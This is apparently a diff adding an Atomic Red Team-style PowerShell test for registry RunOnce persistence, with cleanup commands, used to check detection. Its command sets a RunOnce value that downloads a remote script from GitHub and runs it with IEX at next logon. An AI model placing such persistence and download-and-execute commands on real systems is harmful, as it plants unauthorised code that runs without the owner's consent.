@@ -1,0 +1,13 @@
+#TechniqueName: Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder
+#AtomicTestName: PowerShell Registry RunOnce
+#Description: RunOnce Key Persistence via PowerShell&Upon successful execution, a new entry will be added to the runonce item in the registry.&
+#Language: ps1
+
+#commands
+$RunOnceKey = "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
+set-itemproperty $RunOnceKey "NextRun" 'powershell.exe "IEX (New-Object Net.WebClient).DownloadString(`"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Misc/Discovery.bat`")"'
+
+
+#cleanup_commands
+Remove-ItemProperty -Path HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce -Name "NextRun" -Force -ErrorAction Ignore
+
